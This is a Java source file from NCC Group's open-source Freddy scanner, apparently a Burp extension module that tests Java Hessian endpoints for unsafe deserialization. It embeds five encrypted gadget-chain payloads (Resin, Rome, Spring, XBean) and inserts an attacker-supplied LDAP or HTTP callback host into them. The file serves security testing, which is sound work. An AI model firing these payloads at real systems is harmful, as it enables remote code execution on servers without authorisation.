// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java Hessian library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class HessianModule extends FreddyModuleBase {
    //Resin payload data
    private static final int RESIN_PAYLOAD_CMD_OFFSET = 357;
    private final String RESIN_PREFIX_B64 = decrypt("AqABDhACpu45rAi4IEcBayTOnp5FHQdvLfw4oS0aYWFJm/JOZIOgKOBYKseFFA7YUbYY351Fl2ODK6z2QPXwDihyfm/YqQBiKpqgiQOB8Ig2mrN/55HVo8nBitCuFrRHoaP9zSdfXCAiJHrPivdk/npSFo9o4v7Q1frd8GnXeA9+q6zZVweEbTFsvIhjMXO87Lj9vBCIic/0YorDsSXFlCzHskefv9Vnzy+ExVD8mVPazz84BAhQPg/iBKvLqp7E8C6j736JOGIXDhYPkO7/zKyCYt16k3+7YsLFPbqlwhYsy/V/YyM0ELxp+vJGWzZcWvlwOOWPYcfD8e5vdEgVxjK0+k61izfxiBHRf1O8oP0br5Vvm1eY80ZZY6dOrjwnYO4LiJri3mb5QwKf4kkT+EGtMWpcN7quzlQKUy14ILk4ZUQJNJMHdnbWMVcLMGhZYBajN7CmVcdPUCs7iv8rAlEhEmRPFfqAyZqyr4x3P+sFFxzMLPIMSPQOv3yaiFq8gWvQCrJ64444mwmB2T+Yd11ouGhupA+ThQXL5cl3PuR319BtIkw/GCua0hpbGq9BbfYz26k7YP3fcMlrbFuWhzhe5cUnFgrQPnGfSIYMvwJ4XIMzRwmvUq+pxvun6UVG");
    private final String RESIN_SUFFIX_B64 = decrypt("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");
    //Rome payload data
    private static final int ROME_PAYLOAD_CMD_OFFSET = 325;
    private final String ROME_PREFIX_B64 = decrypt("ZDEoJV8gzmbOV0JgdjjOoYPwz+Z+ZqkAxS8DnKAAL2bHycyFlhzqN0QPsAgVn5eIbVwDY17ZspZQxeeKI1moVOTw/SwYqMVd1TUtjF74+7Wgd4Mz9iXBkp+p3Sv8rQfoa41R80/XnhPMY+bxhhdKyVkn6ei9FmT2e7GrzFViH09kJO9zHkCf2Pf/xcFiWBasnOiH/h5UQuOJcboEanDxjJcWjGxsP6s51p1G9NbN6WrGnwmtVTG2sgQ+phCnRVl2g/DP5n5mqQDFLwOcoAAvZsfJzIWWHOo3RA+wCBWfl4gyUq/ady1g3deDoHy+RyHw0rJNaweUSDMa3gmrVhnxfsKbqLyQ64dk1WQ0aMnc4y/ShrnlDqptXUw2CcryKJAWchVcZIqkUcxYHJIKYyN9hSp7aQWTXWjPPwkrz0OAUlzKGkIbgddsuXX4mHntem15KPhDnnccXpfrcnkci7+zQqLiW3b01XqSnvAKXV7bzjIEPyilBa6LudEcqEFkpjhebrjUpYw8hcix1wft//nqMmCwdirXsYNGTBFK9f+brx8yGHtyM8KljmJa1At+2uQyG2ZeHxA0kudKGY0ZNdOHdw==");
    private final String ROME_SUFFIX_B64 = decrypt("Q105NYmRjdhB7rkSIQ+OAFFWybeueXWSPfsh3jVdt4GRkLhIE/jqxxFY8PmwTNuyq5PimgXou2aFZq5fSIpkl4DLu9cQdnnoVygEoeR2FszbOtBwDZWeisy9E1Go/Hr0aWHIlotvume0ljRcAxTs8OE5bIeDvXzT4ALpNU0y2X8tWNuI1RirjfIhhyQC9ouVHBMiq8cQtc/aq6aWzvYj4SoEjW21vQjAFtXVMui0ZGnElpEa1LJrlegBL97UptXZy1iEgbluHzun2Eh07fVxUJ7VvAx2F/NeBcxiS53/Z9JjCioYxgfXgDM5H6FeT9ozw18zVZHzf3WMXGxfOmsaKXiV0T1Gx6Ok+A2wUvjMJpVjkC4ozLCFECSdtyG43HBLriVa3WLNrJfwIHL+IGx72TUzF6Yaur/QWnZyGtUPP0/Kn/UoItbNej5e16AkNoq5i2gX8y+/7rttCX2aRNgWkvCb2GMlCcL47e47R6orlbsmt4Axn6QRsNHkLkNyk4+JrfpXGqtoUMrEtsL8EZF0VezaOje7JgvksQVBYkCcaoQXVejWisShcomslE+Nead3FbH5ZhBsCu22+PZJ0BxIbmWI3f6IB3JR8R5dDVSRRaENbuhIeN6Q98jTY/mpg6AoyQX1YWtcgynvpvAg83PNN0QoN/u89cf+wvJsa7LwCoRETKMLnKDUsANQF1xaqZ0YQJRZ20KC8nOcjwgfrOu3cLhOEUfA2aDlz2Kr7U2JYQKOLBSBcvAw4iHwhh2g4vVr/t3R27W1hBjVRl9mXaCJxwaUWwGl9XtDu9UnFeHtF4Ki/CXwBHWEW6xc+mGNaa1O4h+h3+jdeTtgzdSUHsxzIkBE9BZXQ/wUKew+JCshck/WeyaJoXwxawFvpW7u+gcHnNij9/4GGx4uOQHA/Pj+jA==");
    //SpringAbstractBeanFactory payload data
    private static final int SABF_PAYLOAD_CMD_OFFSET1 = 93;
    private static final int SABF_PAYLOAD_CMD_OFFSET2 = 491;
    private final String SABF_PREFIX_B64 = decrypt("Gdw52hPPoaP4+YCg/ziL1XYjRHOnCZ7owHPsqPQbVPEHhtMNGyAXPnBY5ihbFqFjuaXIsr/Zj7fERrjjPQbtocrTk589Ony/XpQGvXWuBTehH+oC1eqOUOW4Eh6YXyDk3l2hY6XaGsTxRgK7k3KmwN0Qzn9MPTWNWDcTJeXdmiY=");
    private final String SABF_MIDDLE_B64 = decrypt("0v/ducrvRsMWIJGRiPbdjM9iakMRwRfS1WFGp2vb3SbYBtYWpM6NsPtSkcNKQ+mRGBS7ftDQuSWQDgSzcOktq3hX41cIxSO+PEKGmpHEVgd0qBW+nBGcVP+38oVLZbH8t+SIiz1Y9IGtUOLLHjZv9Aq4gLvV31B+fEOySjoLJkDBfSz+5bm/rwDLyEQW1ktXuybjQRM/1NmIjt23wkWUtAoxEEFHswOJiM0EGMvEzQzTgSQyb4DEx2RbOLScYgu7UNFg0Pqxf+dGl3ChxLfLohWQJ3kAfRvjXb8K+sapyyUyF02P+EvZJuMAaxjl1/Ufc2uT2iJAJqf9M9byvyyqdxR7G3ll5oHutiD5e1V645c=");
    private final String SABF_SUFFIX_B64 = decrypt("zgSd2k9/YfolQlJ5toIplnm/veDIu+hV5/Me3ulR6hkejFnEH82qB5p8STlYdUrsNPGmn0NPLLO+VoMo8IIhiYKpnBn3F01FrwOA3K16wbpI2sirnISt3C5Qpb6RDeBhXc+GlaRHv6G+iBwTRq1FPakFXnmTDZxGWn/ZCBe31GsJdobV8pyJWb6ROmPhMSk6Sa9hyJACBrVlgYkWEI4BAEiY5As16UQMlW1HOgxsYWh/H2P3ZaClgGqtO01iIRP3wGxqD46xs8y5QDOYLYVY1zyEbk9gSF6Cl+HFzofdR0UGKo3qFApUlD1wjNGHH/T+kI4U2eyh0IP2cjBv1MyXpAngWYjJ/xLLnnbGp8rIpoFAQ4eexvlxENuXflRLl9fs/MnlUUteeVlaDNfj3azFnDzAj7ep39+vj6WHao5m/PYKuIC71d9QfnxDsko6CyZAH5NrA+WCeM2ffZBNvfGnz3T8OnM5ZaurPKxujAMfHFcxG41+NjkUu5mzP/Mldo8op2+iH2IEH1Ic8EEQHfMHOJ+Arw3c9ZMB/hWKAR1U3PBi/f25XNjdQcfx/X+cDhFqKAeEs8jc9qPNkk7RxpM7OAPQw2I8HB5K+CSv35BIbgj5A2yHQAK3Xc8cX3dz9j8nclzWuFN8FqB+pCPqQzglug==");
    //SpringPartiallyComparableAdvisor payload data
    private static final int SPCA_PAYLOAD_CMD_OFFSET1 = 835;
    private static final int SPCA_PAYLOAD_CMD_OFFSET2 = 1172;
    private final String SPCA_PREFIX_B64 = decrypt("0R4G9TsHikVAaOeYJ1AZ6nYjRHOnCZ7owHPsqPQbVPEByDsSU1fFuCGyRYXq98qQY/6QO+5eufaV0ENhuh1yGlmbVBxEOKh3jlav50anyZsLPKQ9VFWlpGuDiahWV9KKIAOd/5ehP06rpRWgrHZlB5leKOmLI2VemElSXKgiDqCY0CIRXnkVfJ47+z68rut6VhPvF94nADQP2udLCZaXGITyFCk5CnyIEiJTdzgew5AUQmOe/s1uTNd2u0qBXz3wXSRUz4LAlsa/mKNhlfwSWBfChnItatFVfwMCQGRKYaIKhhpw46d/I42ZbJsn28Me7j/mZcvooGZoWHPQBG0AXux3yEFpWp3uPCGgZ3VHNSd2I0Rzpwme6MBz7Kj0G1TxCziho6twzmvV3uvX7MBlKYdHezqu9Ut/YNXBYaF2jnheJgDTwNybrwL2vdrqpBj+E1XW/xrv9V2n99UICQvQbZjW+seOwiyyPVRWBcM5VGLYBtYWpM6NsPtSkcNKQ+mRGBS7ftDQuSWQDgSzcOktq28QlfXm5Y+pwpRiDpEdrKKap27aqDJMhGk4TUisgZ8HwkREWAhfo95arrwWWIJDUgx/6g+jUro9+YlkyyKF3zKOiGmSt8obkVpxcyBaZBbLxZDf3/5YtAVYeHdcxDI6SRF5XBll9mvQ9iNIiWW5vwkOnlL9MHa/5AxTbmxq7MHczPK8KV/qKMFdgoW2Qg7PaRleBCsXBgZvN4SPq4epmiaFpKPWd9sVcRRNiHFYkYWbPF+GtnQ5zCeQTMrycaECT4zvHTy6yQG2LjGyzJAkZb02U7QD5c3/bFgIAoZo5uk8gGI2UfxOtvvb0znkNJ0mEfpnGIchglQ7h3EgaXIj7v80eJolqmaTuqYL+l5HE/7wIg7O4mcDO/TOBVrsI4iFu5/kKcu5AD0iCZO7nksKsRLAAINA39XtFXAcPx4XTn6emRXJfXhuhR006eN166TRUkryFdLO+uNSpE37ygEw5O//q4aDUqZ1aw6AXgi+nCyk9jEbSoX+EcEonzlVg+Og9Yu/AvRky99GMDcj6NxJtNE1af+19VPkz3vfz+xtc3es3peMpzy02UOAFPlH4/N3hhyKavKlOYyR8ViTAc/5vXHQuPnhdi8EVbW6CPdNtwiXypjHQEpHi5d0hPjmrK3htVqF7+iixhtGgxwgx76shVmjFIQUB114/ZsD4hxqjWwxRXglW/h7dsNrchpoiGatBb5HFKxTYaGy3I9iEtcKfCQSSadCTvtHByO5T1pjIvpOFVgG4u3M5KZZjNM1Q1AxaPV9jwNbcqGrZ6j7zIN6zcBe1P22Z3sNF65scy4Lv9OivO3ehE32LxgaN8SrAHwwFkXuvN413D0nnXr0ILR9vfXdUKChnCtAKKQ/aUPr5H1Zla8vY2gicbirEdHko86WMQw9g+5EqdFREifpXb7ZcXSGHw/gnuATHb8CM66CS7IpALNKa0xkcIHm6CkkZYsTEg==");
    private final String SPCA_MIDDLE_B64 = decrypt("4wutzdypAjJSXs3gDFvsXCFvQy8xvc37fR2oNjsPFCO87d6ETfYvGBo3xKsAfDAWxAFZPtfCME4SQTH5RWwjcKMeOgbPc9DF7S+J0q5t+4f1PbPdMiJDgr4mE16vOI3ekpsSMQvZEA2k+ovbxWtyqn3emMGoDG+ZSNlZVWeEh7AIjVvzH4wd0OhFMFim/HZumIcYlEdGJBPRSfUs52ct0nQHDvCPjrGZ/o+hkNyuIhODo+qn89SfJLZYGw6g8zBT");
    private final String SPCA_SUFFIX_B64 = decrypt("zgSd2k9/YfolQlJ5toIplnm/veDIu+hV5/Me3ulR6hkejFnEH82qB5p8STlYdUrsNPGmn0NPLLO+VoMo8IIhiYKpnBn3F01FrwOA3K16wbpI2sirnISt3C5Qpb6RDeBhXc+GlaRHv6G+iBwTRq1FPakFXnmTDZxGWn/ZCBe31GsJdobV8pyJWb6ROmPhMSk6Sa9hyJACBrVlgYkWEI4BAEiY5As16UQMlW1HOgxsYWh/H2P3ZaClgGqtO01iIRP3wGxqD46xs8y5QDOYLYVY1zyEbk9gSF6Cl+HFzofdR0UGKo3qFApUlD1wjNGHH/T+kI4U2eyh0IP2cjBv1MyXpAngWYjJ/xLLnnbGp8rIpoFAQ4eexvlxENuXflRLl9fsqM5uc3o/Bo9l/LtfU3AjICuStxbb3WY4HSYFENIsI32E7jSs/sWFW1RhCGzcXi4eQ09L53i1NrDfoNs/Om6UU7+Zpd9t3nznFk4oBMJYVLDoxd86+cZ2RQ4wQYDrgvKcYWZyTNNdSnITaiT6H1gGc2/voHqTxfxn0tr+w4TBBnM2NK/aMu8LEG5AHtkEvaB2diNEc6cJnujAc+yo9BtU8QHIOxJTV8W4IbJFher3ypBj/pA77l659pXQQ2G6HXIaWZtUHEQ4qHeOVq/nRqfJmws8pD1UVaWka4OJqFZX0opPkPsaCzeZhuJY9tdo8ZmjZZgq98ypLCUkSwhTNoS/wAH7ykv9QQSWhY5kUtBjmllK81Cjsf/BKZh68MpJAB3ZVYlgjzC0XzcEVaD0reaug546DLfZsrTNJx1ox1RbagMkaGzwhShp6jh08ep0oM3xu+ByodPf4g0AD2kYVs04+w==");
    //XBean payload data
    private static final int XBEAN_PAYLOAD_CMD_OFFSET = 298;
    private final String XBEAN_PREFIX_B64 = decrypt("0R4G9TsHikVAaOeYJ1AZ6nYjRHOnCZ7owHPsqPQbVPEByDsSU1fFuCGyRYXq98qQY/6QO+5eufaV0ENhuh1yGlmbVBxEOKh3jlav50anyZsLPKQ9VFWlpGuDiahWV9KKl7d2smJKS4alqSTjBh+Yjkpz2tUaBwchS6WddvzccWRmpD8OuVnQdxxKtPjuz7CvWJv8dRUB4l2YSSOC781e87xjXL4CpGJrD8cj5fjnIfbUCvP1F2I/fTgm8BJCleRTEFbYhy1GDFDCKjOFijNTjKMMKY8zFsWidxeKDDe5Jl0LUbMUrjZr5nniw17WpvPBrIi1Vjt0Mf/FVHCGv+cilfdFaZRXrnREUsNNC9pU/mH2s0lO2lKOeMkkBQvCAKmYGDqbd5d10gp3YB1t9cIIzaeXIuX8c07d/5fHPxwxQRVc3ioW+zJOUsKCVoX/4Yc/zTRBIipYY/m/r6cgsCsTF4b9Z/5SfAbt/qNbM0IapMaqcFZWLc7AFespZwAMp91RsY1/SzQ+M0Rdi4ddrWl1zuUQDSdLJvvUqQt6azSACoE=");
    private final String XBEAN_SUFFIX_B64 = decrypt("BVnuiYOlrRq1wiNXPUTtJ4jCrTbN0BK5aRLPjltMvx33Ia4DzZ44NmgLlEp/+gi1U3Ja1HYgrWHyxDpANzx4VmOuNzfRRXeqtULDQjUkjn8AwG6PinjM1qoN/s3lOET0Vodk1C4S9UUO5qXEzL+P18CIqUSMkN2MvQXbT+wA7EHozuphCYoPRmmr5P5y9Cl5CUwVJmB3JCV8jkXYiLAC6zttrzB8muSXi6s5ipJsgtu4Nvmcji8uXpljstNHdX8REsHiVvyX0UFao1ZrZpxMentsrP564TC6AQDwZg+9JBgYzQuYyZCFpMHwYR23GYxSLdWMKfEaX3Wv+/+Eps0nZWhYea7aDxjiJe2PRHSY35zdpQjISfPjyT96Hw94r218wiacceAt6E7KzT0ofEo/j153u0Uk9O6Wjo3CoQbqrQ50MLHu4XxVqcRcfU5Mw25NTVMSjtiDBP3kwzPYeaWelG9gaHLT7z6OaaYXxcu1JWORChJK1NMcE6cRH/ugqtVwnkfawgnTn4l/xvh4/GPbGiqy/MVoKb+y6p6hDknKehiDy8wlSC5HuVhnviVvdbpBZz0TlElOmjl2jJ9abmWNhbIAsQPhK7+txShiL81nOUJgm0SoGwanUyVzaW8xdLz0vRkMUOLxtU8fIdkKtwOQ+WlzQiRz+pYK4jf9Viij+Gd/sRS6MkEVjMLNNRoaaELALZnVps9jXup3qpb/pcpq+ZClHpT7Hpanl0UpZsbiLtOY+I0Mj4MH2s/6IVwgt2bqNEwyhZsx81ItOyMSK3pPDJ2sZU7ra2atzVsACB2HrWQxWgDL35Q+Zpt2QwY/3K78Qp3ItLgH1M3m1PAsrJPsWsOBVrunWQfnBcBGTTtLMrkT8MiNiy5WgNWPJPH8/sU9pQwyKhwRWiF7eXXcq0Xd0iHBvQT1SWpyvX1gB7x/PeVfq6WGMUgumkJxhblxxumK5RANJ0sm+9SpC3prNIAKgQ==");
    private byte[] RESIN_PAYLOAD;
    private byte[] ROME_PAYLOAD;
    private byte[] SABF_PAYLOAD;
    private byte[] SPCA_PAYLOAD;
    private byte[] XBEAN_PAYLOAD;

    protected void initialiseModule() {
        setName("Hessian");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        RESIN_PAYLOAD = buildBinaryPayloadBuffer(RESIN_PREFIX_B64, RESIN_SUFFIX_B64, false);
        ROME_PAYLOAD = buildBinaryPayloadBuffer(ROME_PREFIX_B64, ROME_SUFFIX_B64, false);
        SABF_PAYLOAD = buildBinaryPayloadBuffer(SABF_PREFIX_B64, SABF_MIDDLE_B64, SABF_SUFFIX_B64, false);
        SPCA_PAYLOAD = buildBinaryPayloadBuffer(SPCA_PREFIX_B64, SPCA_MIDDLE_B64, SPCA_SUFFIX_B64, false);
        XBEAN_PAYLOAD = buildBinaryPayloadBuffer(XBEAN_PREFIX_B64, XBEAN_SUFFIX_B64, false);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new byte[]{0x4d, 0x74, 0x00}, IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("com.caucho.hessian.io.HessianProtocolException", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload(new byte[]{0x00}, "unknown code for readObject at 0x0");

        registerActiveScanCollaboratorPayload(PN_RESIN, true);
        registerActiveScanCollaboratorPayload(PN_ROME, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPCA, true);
        registerActiveScanCollaboratorPayload(PN_XBEAN, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_RESIN:
                return generateBinaryPayload(RESIN_PAYLOAD, RESIN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);

            case PN_ROME:
                return generateBinaryPayload(ROME_PAYLOAD, ROME_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGABF:
                return generateBinaryPayload(SABF_PAYLOAD, SABF_PAYLOAD_CMD_OFFSET1, SABF_PAYLOAD_CMD_OFFSET2, "ldap://" + hostname + "/", false);

            case PN_SPRINGPCA:
                return generateBinaryPayload(SPCA_PAYLOAD, SPCA_PAYLOAD_CMD_OFFSET1, SPCA_PAYLOAD_CMD_OFFSET2, "ldap://" + hostname + "/", false);

            case PN_XBEAN:
                return generateBinaryPayload(XBEAN_PAYLOAD, XBEAN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);
        }
        return null;
    }
}
